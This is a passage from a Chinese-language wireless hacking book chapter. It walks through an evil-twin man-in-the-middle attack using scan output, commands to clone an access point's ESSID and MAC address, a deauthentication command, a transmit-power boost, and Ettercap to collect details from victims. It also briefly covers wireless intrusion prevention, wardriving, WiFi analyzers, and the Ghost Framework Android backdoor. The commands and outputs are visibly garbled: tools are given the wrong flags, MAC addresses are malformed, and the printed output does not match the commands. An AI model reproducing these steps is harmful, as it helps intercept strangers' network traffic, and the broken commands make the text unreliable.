
```
CH 14 || Elapsed: 16 s || 2013-07-17 05:07
BSSID PWR #Data,#/ CH MB ENC CIPHER AUTH SSID
00:25:9C:97:4F:48 -30 15 1 9 WPA2 PSK Mandela2
08:36:B4:72:22:76 -50 13 0 6 WPA2 PSK bkelin.276
0A:38:B4:72:22:77 -45 9 0 6 WEP PSK 7871
0A:05:D8:B8:B4:5E -50 0 0 11 WEP PSK <length: 0>
20:76:06:B8:C4 -54 5 0 0 WPA2 PSK <length: 0>/tim
FE:F5:28:A0:B3:2C -53 10 1 2 WPA2 PSK Centurylink256
00:00:00:00:00:00 -57 38 0 0 6 WEP PSK <length: 0>
00:25:9C:97:4F:48 -56 0 0 11 WEP PSK swish
B8:99:59:59:29:89 -60 8 0 1 WPA2 PSK <length: 0>
B8:99:59:59:29:89 -60 9 0 1 WPA2 PSK <length: 0>
B8:99:59:59:29:89 -60 10 0 1 WPA2 PSK HOME2068
B8:99:59:59:29:89 -60 0:01 WPA2 PSK <length: 0>
FE:F5:28:A0:B3:2C -53 5 0 11 WEP PSK WSC1
00:14:0C:00:08:02 -63 4 0 0 11 WEP TKIP Fresca
STATION PWR Rate Lost Frame Probe
(not associated) 00:1E:8F:81:28:25 -24 0-1 60 40 NETGEAR
00:25:9C:97:4F:48 00:17:B4:90:9F -33 0 -1 0 1
```

选择一个 `Essid` 来执行中间人（`MITM`）攻击。

> 一旦他连接到他的 WiFi 网络，我们就可以进行攻击。现在使用此命令创建一个与 `ESSID` 相同的 `SSID` 和 `MAC` 地址的 `AP`：`airodump-ng -a 00:09:5B:6F:64:1EE --essid "Elroy" -c 11 mon0`

```bash
root@airbase:~# airmon-ng -a 00:09:5B6F:64:1E --ssid "Elroy" -c 11 mono
Interface  BSSID                Channel  Data  Quality  ESSID
wlan0      00:09:5B:6F:64:1E      11      55      75      Elroy
wlan0      00:09:5B:6F:64:1E      11      50      75      berlin
wlan0      00:09:5B:6F:64:1E      11      50      75      California
wlan0      00:09:5B:6F:64:1E      11      50      75      long-term
wlan0      00:09:5B:6F:64:1E      11      50      75      wispy-hotspot
wlan0      00:09:5B:6F:64:1E      11      50      75      guest-network
wlan0      00:09:5B:6F:64:1E      11      50      75      home-wifi
wlan0      00:09:5B:6F:64:1E      11      50      75      home-wifi
wlan0      00:09:5B:6F:64:1E      11      50      75      linksys-guest
wlan0      00:09:5B:6F:64:1E      11      50      75      Free-WiFi
wlan0      00:09:5B:6F:64:1E      11      40      75      Starbucks
wlan0      00:09:5B:6F:64:1E      11      40      75      Airport_Free
```

注：此处原文中 `mono` 处疑似为 `mon0` 的误，`0:01` 处也为笔误。

现在，使用以下命令进行取消认证（`deauth`）：

```bash
`aireplay-ng --deauth 00:09:5B:64:1E`
```

通过此命令，我们可以将功率提高到最大：

```bash
`iwconfig wlan0 power 30`
```

输入此命令检查功率：

```bash
`root@:~ # iwconfig wlan0`
`wlan0      IEEE802.11bg:off/any`
`Mode:Managed  Access Point:Not-Associated  Tx-Power`
```

一旦用户连接到我们创建的 `AP`，我们可以通过 `Ettercap` 轻松收集详情。

## 12.4 无线入侵系统

`WIPS` 除了检测外，还包含了自动防止危险的能力。自动防御需要 `WIPS` 进行正确的识别和分类。良好的 `WIPS` 可以防止以下类型的威胁：

- 非法接入点（Rogue access points）——`WIPS` 应该理解非法 `AP` 与外部（邻居）`AP` 之间的区别
- 配置错误的 `AP`
- 客户端误连接
- 未授权连接
- 中间人攻击
- 自组网络（Ad hoc networks）
- `MAC` 欺骗
- 蜜罐攻击 / 恶意孪生攻击（`evil twin attack`）
- 拒绝服务攻击

![](img/8ce6ad080bbaee4f5508e48ea7a3d6ee_294_0.png)

图 10 无线入侵防御系统

## 12.5 WiFi 绘图

![](img/8ce6ad080bbaee4f5508e48ea7a3d6ee_295_0.png)

## 漫游嗅探（Wardriving）

车载嗅探是在移动中寻找无线网络的行为。它包括在区域内缓慢移动以定位无线信号。这可以通过一个人或两人完成：一个人负责驾驶，另一个人搜索无线网络。在车辆中使用智能手机搜索 `WiFi` 可能非常简单。然而，这个词通常指的是专门用于定位和记录无线网络的硬件和软件。通常包括车载嗅探设备：

## 漫游步行（Warwalking）

步行提供关于使用的无线连接类型的信息，可能是开放、关闭或 `WEP` 节点。这可以让黑客了解 `WiFi` 热点并确保安全。为了攻击 `WiFi` 网络，黑客可能会利用这些信息。

## 漫游飞行（War Flying）

行为本身是搜索无线网络。也称为接入点发现、局域网攻击、`WiFi` 绘图等。有些人通过寻找 `AP` 的步行或飞行开发了 `War Walking` 和 `War Flying`。记住，你并不一定是在寻找无线网络进行攻击。观察房屋的情况是值得的。当然，问题在于，当你观察房屋时，一些不守法的人可能会注意到门开着。这些人无法抵抗进入住宅（或网络）的尝试。

## 12.6 WIFI 分析仪

确定你的路由器/接入点的 `WiFi` 问题以及最佳通道或位置！此软件可以将你的 `Windows 10` 电脑/笔记本电脑、平板电脑或手机变成无线网络分析。

### 12.6.1 为什么你需要 WiFi 分析仪

干扰、障碍、家庭 `WiFi` 功能以及其他因素都会影响信号范围。即使你的路由器声称具有特定范围，也不要期望它在所有方向都是相同的。

### 12.6.2 最佳 Windows WiFi 分析应用

我们认为，最好的 `Windows WiFi` 分析应用应该是易于使用的，包含优化 `WiFi` 性能所需的所有功能，满足企业客户的需求，并由一个致力于创建最好的 `WiFi` 分析工具的资深开发人员团队积极开发。

- `NetSpot` 是 `Windows` 上唯一的专业 `WiFi` 分析工具。
- `InSSider` 是 `Windows` 操作系统上著名的 `WiFi` 分析工具。
- `Wi-Fi Analyzer` 是可以从微软商店下载的 `Windows 10` 软件。
- `Vistumbler` —— 通过支持 `GPS` 和实时 `Google Earth` 监控从许多其他 `WiFi` 分析中脱颖而出。
- `Wireshark` 是一个免费开源的协议分析仪。

## 12.7 Ghost Framework -- 远程控制 Android 设备

`Ghost Framework` 不是一个黑客工具，我们也没有尝试破解安卓智能手机。`Ghost Framework` 是一个 `Android` 后渗透框架，使用 `Android` 调试桥（`ADB`）远程访问 `Android` 设备。这提供了一个持久连接并充当后门。

## 12.8 WLAN 安全防护措施
